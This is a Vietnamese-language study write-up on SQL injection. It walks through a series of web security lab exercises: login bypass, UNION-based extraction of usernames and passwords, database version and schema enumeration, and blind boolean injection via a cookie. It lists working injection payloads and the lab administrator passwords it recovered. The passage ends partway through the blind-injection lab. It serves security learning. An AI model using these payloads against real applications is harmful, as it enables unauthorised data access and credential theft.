# Tìm hiểu về SQL injection
- Người thực hiện: Lê Thị Mỹ Tiên
- Cập nhật lần cuối: 21/8/2025
## Mục Lục
## Nội dung
### 1. Khái niệm - Tác động
- SQL Injection (SQLi) là một lỗ hổng bảo mật web cho phép kẻ tấn công chèn hoặc can thiệp vào các truy vấn SQL mà ứng dụng gửi đến cơ sở dữ liệu.

- Tác động: 
  + Rò rỉ dữ liệu nhạy cảm (dữ liệu người dùng khác, thông tin hệ thống, v.v.).
  + Sửa đổi hoặc xóa dữ liệu, gây thay đổi nội dung và hành vi ứng dụng.
  + Trong trường hợp nghiêm trọng, có thể chiếm quyền kiểm soát máy chủ hoặc hạ tầng backend.
  + Có thể dẫn đến tấn công từ chối dịch vụ (DoS).

---

### 2. Cách phát hiện lỗ hổng SQL injection
Có thể phát hiện SQLi theo cách thủ công bằng cách:
- Ký tự dấu nháy đơn 'và tìm kiếm lỗi hoặc các bất thường khác.

- Một số cú pháp SQL cụ thể đánh giá theo giá trị cơ sở (gốc) của điểm vào và theo một giá trị khác, đồng thời tìm kiếm sự khác biệt có hệ thống trong phản hồi của ứng dụng.

- Các điều kiện Boolean như OR 1=1 và OR 1=2, và tìm kiếm sự khác biệt trong phản hồi của ứng dụng.

- Tải trọng được thiết kế để kích hoạt độ trễ thời gian khi thực hiện trong truy vấn SQL và tìm kiếm sự khác biệt về thời gian phản hồi.

- Tải trọng OAST được thiết kế để kích hoạt tương tác mạng ngoài băng tần khi được thực hiện trong truy vấn SQL và giám sát mọi tương tác phát sinh.
  
---

#### 2.1 Trong các phần khác nhau của truy vấn
- Hầu hết các lỗ hổng SQL injection đều xảy ra trong `WHERE` của một `SELECT`.
- Trong `UPDATE`, ở các giá trị được cập nhật hoặc `WHERE`.
- Trong `INSERT`, bên trong các giá trị được chèn vào.
- Trong `SELECT`, bên trong tên bảng hoặc cột.
- Trong `SELECT`, mệnh đề `ORDER BY`.

---

##### 2.1.1 Truy vấn dữ liệu ẩn
📜**LAB 1: SQLI TRONG MỆNH ĐỀ WHERE CHO PHÉP TRUY XUẤT DỮ LIỆU ẨN**

Bài thực hành này chứa lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện một truy vấn SQL như sau:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Thực hiện một cuộc tấn công tiêm SQL khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa phát hành.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/23e7245a-aec2-4c44-9eb0-99480937f093" />


---


##### 2.1.2 Phá vỡ logic ứng dụng
Nếu ứng dụng kiểm tra thông tin đăng nhập bằng câu truy vấn sau:<br>
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
Nếu truy vấn trả về thông tin chi tiết của người dùng, thì đăng nhập thành công. Nếu không, đăng nhập sẽ bị từ chối.

Trong trường hợp này, kẻ tấn công có thể đăng nhập bằng bất kỳ người dùng nào mà không cần mật khẩu. Chúng có thể thực hiện việc này bằng cách sử dụng chuỗi chú thích SQL -- để xóa kiểm tra mật khẩu khỏi mệnh đề truy vấn WHERE. 
Ví dụ:<br> `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
📜 **LAB 2: SQLI CHO PHÉP BỎ QUA ĐĂNG NHẬP**
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6976fdfb-7c4f-4c36-a8b0-b19acab55f3f" />

---

##### 2.1.3 Lấy dữ liệu từ cơ sở dữ liệu khác - Tấn công SQLi UNION
Ta có thể sử dụng UNION để thực thi truy vấn SELECT bổ sung và thêm kết quả vào truy vấn ban đầu. Ví dụ:

Nếu một ứng dụng thực hiện truy vấn sau có chứa thông tin đầu vào của người dùng `Gifts`: <br>
`SELECT name, description FROM products WHERE category = 'Gifts'` <br>
 Kẻ tấn công có thể gửi thông tin đầu vào:
 `' UNION SELECT username, password FROM users--`
 
Điều này khiến ứng dụng trả về tất cả tên người dùng và mật khẩu cùng với tên và mô tả sản phẩm.

Để UNION có hiệu quả, hai yêu cầu chính phải được đáp ứng:
- Các truy vấn riêng lẻ phải trả về cùng số cột.
- Các kiểu dữ liệu trong mỗi cột phải tương thích giữa các truy vấn riêng lẻ.

###### 2.1.3.1 Xác định số lượng cột
Khi thực hiện SQL Injection dạng UNION, cần biết số lượng cột trong truy vấn gốc. Có hai phương pháp xác định:

- ORDER BY:
  + Thêm ORDER BY 1--, ORDER BY 2--, ORDER BY 3--... vào payload.
  + Khi vượt quá số cột thực tế, cơ sở dữ liệu báo lỗi (ví dụ: out of range).
  + Dựa vào lỗi hoặc sự khác biệt trong phản hồi, có thể suy ra số lượng cột.
- UNION SELECT với NULL:
  + ThửUNION SELECT NULL--, UNION SELECT NULL,NULL--, UNION SELECT NULL,NULL,NULL--...
  + Nếu số lượng NULL không khớp với số cột → báo lỗi.
  + Khi khớp → truy vấn hợp lệ, có thể trả về một dòng chứa toàn NULL.
  + Dấu hiệu trong phản hồi HTTP có thể là: thêm dữ liệu, báo lỗi khác, hoặc không khác biệt gì.

📜**LAB 3: SQLI UNION, XÁC ĐỊNH SỐ LƯỢNG CỘT ĐƯỢC TRẢ VỀ BỞI TRUY VẤN**

Lab này xác định số cột được truy vấn trả về bằng cách thực hiện tấn công SQL injection UNION trả về một hàng bổ sung chứa các giá trị null

Bước 1: Sửa đổi tham số `category` bằng cách gán giá trị  `'+UNION+SELECT+NULL--` Quan sát thấy lỗi xảy ra.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5e8f0d90-96f8-41ed-89a4-5fedd38e908c" />
Bước 2: Sửa đổi tham số category để thêm một cột bổ sung có chứa giá trị null
`'+UNION+SELECT+NULL,NULL--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/70c8e582-76af-40fa-825e-8dc4006461eb" />
Bước 3: Tiếp tục thêm giá trị null cho đến khi lỗi biến mất và phản hồi bao gồm nội dung bổ sung có chứa giá trị null.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4181a66f-dec6-43c7-887b-9b8fd09b9da3" />

###### 2.1.3.2 Tìm các cột có dữ liệu quan trọng:
- **Mục đích**: SQL injection với UNION cho phép chèn truy vấn để lấy thêm dữ liệu.
- **Điều kiện**: Cần tìm cột trong kết quả truy vấn gốc có kiểu dữ liệu chuỗi hoặc tương thích với chuỗi.
- Các bước chính:
  + Xác định số lượng cột của truy vấn gốc.
  + Thử từng cột bằng cách chèn giá trị chuỗi 'a' trong từng vị trí và để các cột còn lại NULL. Ví dụ: `' UNION SELECT 'a',NULL,NULL,NULL--`
  + Quan sát phản hồi:
    + Nếu có lỗi kiểu dữ liệu (ví dụ lỗi chuyển đổi kiểu), cột không phù hợp.
    + Nếu phản hồi chứa chuỗi vừa chèn, cột đó có thể dùng để trích xuất dữ liệu.

📜**LAB 4: SQLI UNION, TÌM MỘT CỘT CHỨA VĂN BẢN**
Bước 1: Xác định số lượng cột: 

`'+UNION+SELECT+NULL,NULL,NULL--`. Truy vấn thành công xác định được có 3 cột 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/636cc615-85c3-4cb5-a734-45bfd030c80b" />
Bước 2: Thay thế mỗi giá trị null bằng giá trị ngẫu nhiên. Nếu xảy ra lỗi, chuyển sang giá trị null tiếp theo
`'+UNION+SELECT+'dJAwsm',NULL,NULL--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ae794735-470a-468e-bdfd-e7f59b21a53a" />
Khi thử: `'+UNION+SELECT+NULL,'dJAwsm',NULL--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4701e3f0-5750-4644-9a21-4134aa7b769b" />

###### 2.1.3.3 Lấy dữ liệu quan trọng
Khi đã xác định được số cột được trả về bởi truy vấn ban đầu và tìm ra những cột nào có thể chứa dữ liệu chuỗi,ta có thể truy xuất các dữ liệu quan trọng

📜**LAB 5: SQLI UNION, LẤY DỮ LIỆU TỪ CÁC BẢNG KHÁC**

Cơ sở dữ liệu có một bảng mang tên users, bao gồm các cột username và password.

Để hoàn thành bài thực hành, bạn cần khai thác lỗ hổng bằng kỹ thuật SQL injection với câu lệnh UNION để thu thập toàn bộ tên người dùng và mật khẩu, sau đó dùng dữ liệu này để đăng nhập với quyền administrator.

Bước 1: Xác định số cột →  Có 2 cột `'+UNION+SELECT+ NULL, NULL --` 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ba6d5a4d-98d4-4c33-aa8c-cfdacbf2fc21" />
Bước 2: Xác định những cột nào có chứa dữ liệu chuỗi →  cả 2 cột đều chứa dữ liệu chuỗi
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4b1a33b3-8ec2-4d07-922f-a481f6d912e4" />
Bước 3: Lấy nội dung của bảng `users` bằng:

`'+UNION+SELECT+username,+password+FROM+users--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3abd604a-a45f-4c4e-ac36-fa76e1dde5d0" />
Bước 4: Đăng nhập với người dùng `administrator` với mật khẩu `u0gz50s24yw0i0zvod9l`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/046dc171-8be0-4b13-821e-345e0594016a" />

###### 2.1.3.4 Lấy nhiều giá trị trong một cột duy nhất

Có thể truy xuất nhiều giá trị cùng lúc trong một cột duy nhất này bằng cách nối các giá trị lại với nhau bằng cách thêm dấu phân cách để phân biệt các giá trị được kết hợp. Ví dụ: trên Oracle, bạn có thể gửi dữ liệu đầu vào:

`' UNION SELECT username || '~' || password FROM users--`

Câu lệnh này sử dụng chuỗi double-pipe ||, một toán tử nối chuỗi trong Oracle. Truy vấn được chèn sẽ nối các giá trị của trường usernamevà password, được phân tách bằng ~.

📜**LAB 6: SQLI UNION, TRUY XUẤT NHIỀU GIÁ TRỊ TRONG MỘT CỘT**

Bước 1: Xác định số cột và những cột có chứa dữ liệu văn bản
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4a7f7a1e-f92c-42d7-a4f0-108b19e2db4b" />
Bảng có 2 cột và cột thứ 2 có chứa dữ liệu chuỗi
Bước 2: Lấy nội dung bảng `users` bằng:

`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/da3be821-6d72-4c43-94c9-53cdd3f6da35" />
Bước 3: Đăng nhập với các tài khoản đó

---

##### 2.1.4 Kiểm tra cơ sở dữ liệu
###### 2.1.4.1 Truy vấn loại và phiên bản cơ sở dữ liệu
- Microsoft, MySQL	`SELECT @@version`
- Oracle	`SELECT * FROM v$version`
- PostgreSQL	`SELECT version()`

📜**LAB 7: SQLI - TRUY VẤN LOẠI VÀ PHIÊN BẢN CSDL TRÊN ORACLE**

Bước 1: Xác định số cột và những cột nào chứa dữ liệu chuỗi trong bảng `dual`

Bước 2: Sử dụng để xác định phiên bản csdl:
`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/647b0a88-a216-4105-9198-337b2415779c" />

📜**LAB 8: SQLI - TRUY VẤN LOẠI VÀ PHIÊN BẢN CSDL TRÊN MySQL và Microsoft**
Sử dụng đoạn mã sau để hiển thị phiên bản csdl:
`'+UNION+SELECT+@@version,+NULL#`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/05dcbe6e-486d-4636-a5f8-c003a69ff3b0" />

###### 2.1.4.2 Liệt kê nội dung
📜**LAB 9: SQLI -  LIỆT KÊ NỘI DUNG CƠ SỞ DỮ LIỆU TRÊN CƠ SỞ DỮ LIỆU KHÔNG PHẢI ORACLE**

Lab này giúp xác định tên của bảng lưu trữ tên và mật khẩu người dùng và các cột chứa trong bảng, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng. Sau đó đăng nhập với tư cách administrator.

Bước 1: Xác định bảng có 2 cột và cả 2 cột có chứa dữ liệu chuỗi: `'+UNION+SELECT+'abc','def'--`

Bước 2: Lấy danh sách các bảng trong cơ sở dữ liệu:
`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d7466efe-0eac-4148-81d4-8d9aca5c7474" />
**Bảng cần tìm là `users_skzuou`**

Bước 3: Lấy thông tin người dùng trong bảng users_skzuou:

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_skzuou'--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/22bddf7d-6a49-4910-ba9b-74dae5d51293" />

**Bảng `users_skzuou` có 3 thông tin `username_apyucq`, `email`, `password_kwrrxk`**

Bước 4: Sử dụng để tìm tên và mật khẩu người dùng:

`'+UNION+SELECT+username_apyucq,+password_kwrrxk+FROM+users_skzuou--`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/902bf7f8-4445-4425-b787-2cb89d0b6f41" />
Bước 5: Đăng nhập với người dùng: administrator - 59n3hpytgcyoahyjzoww

📜**LAB 10: SQLI -  LIỆT KÊ NỘI DUNG CƠ SỞ DỮ LIỆU TRÊN CƠ SỞ DỮ LIỆU TRÊN ORACLE**

Bước 1: Xác định bảng có 2 cột và cả 2 cột có chứa dữ liệu chuỗi: `'+UNION+SELECT+'abc','def'+FROM+dual--`

Bước 2: Lấy danh sách các bảng trong cơ sở dữ liệu:
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/159baf09-9c7b-4d06-b984-57100f2eba71" />

**Bảng cần tìm là `USERS_ZXNGKF`**

Bước 3: Lấy thông tin người dùng trong bảng USERS_ZXNGKF:

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='USERS_ZXNGKF'--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a69327b4-f420-4479-a4f7-e3aef157df28" />



**Bảng `USERS_ZXNGKF` có 3 thông tin `EMAIL`, `PASSWORD_UXHAGP`, `USERNAME_IMTUVJ`**

Bước 4: Sử dụng để tìm tên và mật khẩu người dùng:

`'+UNION+SELECT+USERNAME_IMTUVJ,+PASSWORD_UXHAGP+FROM+USERS_ZXNGKF--`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dfeecf63-28ef-4130-9983-1295d34e642e" />

Bước 5: Đăng nhập với người dùng: administrator - ghczq9nns2x2kdffkm32

---

##### 2.1.5 Lỗ hổng SQLi mù:
Tiêm SQL mù là dạng SQL injection mà ứng dụng bị lỗ hổng nhưng không hiển thị kết quả truy vấn hoặc thông tin lỗi. Do đó, các kỹ thuật như UNION không hiệu quả. Để khai thác, kẻ tấn công phải dùng phương pháp khác (ví dụ: dựa vào phản hồi đúng/sai hoặc thời gian phản hồi) để lấy dữ liệu trái phép.

###### 2.1.5.1 Khai thác lỗi SQLi bằng cách kích hoạt phản hồi có điều kiện
- Ứng dụng sử dụng giá trị TrackingId trong cookie để truy vấn cơ sở dữ liệu.
- Truy vấn dễ bị SQL injection, nhưng không trả về dữ liệu trực tiếp. Ứng dụng chỉ hiển thị thông báo khác nhau (“Chào mừng trở lại”) tùy kết quả truy vấn.
- Kẻ tấn công có thể khai thác sự khác biệt này bằng cách chèn các điều kiện logic (đúng/sai) để suy ra dữ liệu.
- Bằng cách kiểm tra từng ký tự (so sánh lớn hơn, nhỏ hơn, bằng), có thể trích xuất thông tin nhạy cảm như mật khẩu của người dùng.

📜**LAB 11: SQLI MÙ VỚI PHẢN HỒI CÓ ĐIỀU KIỆN**

Phòng thí nghiệm có lỗ hổng SQL injection mù qua cookie. Ứng dụng dùng giá trị cookie để truy vấn, không trả về kết quả hay lỗi, nhưng hiển thị thông báo "Welcome back" nếu có dữ liệu. Cơ sở dữ liệu có bảng users với cột username và password. Mục tiêu là khai thác lỗ hổng để lấy mật khẩu của tài khoản administrator và đăng nhập thành công.

Bước 1: Thay đổi `TrackingId = lymgpqdLQyOrztR3` thành `TrackingId=lymgpqdLQyOrztR3' AND '1'='1` -> Tin nhắn `Welcome back` xuất hiện
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a5836108-9859-4b59-ad21-34bd02d708ea" />
Bước 2 đổi thành `TrackingId=lymgpqdLQyOrztR3' AND '1'='2 ` -> -> Tin nhắn `Welcome back` không xuất hiện
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f376d7b9-46c3-4aa7-9dd2-db0ff014b8e8" />
Bước 3: Đổi thành `TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users LIMIT 1)='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f1cf2772-8ceb-40d3-a5b2-9693fbafaf10" />
Có tin nhắn Welcome back xác minh rằng điều kiện là đúng, xác nhận rằng có một bảng có tên là `users`.

Bước 4: Đổi thành `TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5a3eb08f-b92f-4998-b6bb-493853bccd6d" />
Có tin nhắn Welcome back xác minh rằng điều kiện là đúng, xác nhận rằng có một người dùng được gọi là `administrator`

Bước 5: Bước tiếp theo là xác định số ký tự trong mật khẩu của administrator. Đổi thành 

`TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/341b6858-cf59-4c53-b67c-2d05340b0cd7" />
Điều kiện này phải đúng, xác nhận rằng mật khẩu dài hơn 1 ký tự.

Bước 6: 
Gửi một loạt giá trị theo dõi để kiểm tra độ dài mật khẩu khác nhau

`TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/66ecec92-a861-4305-ad3a-d64a58374891" />
Tiếp tục thay đổi giá trị để xác định độ dài của mật khẩu:

`TrackingId=lymgpqdLQyOrztR3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2affdd0a-b9be-42ef-ab1a-554e02c1f54b" />
**Xác định được độ dài của mật khẩu, thực tế là 20 ký tự**

Bước 7: Trong Intruder: `TrackingId=lymgpqdLQyOrztR3' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

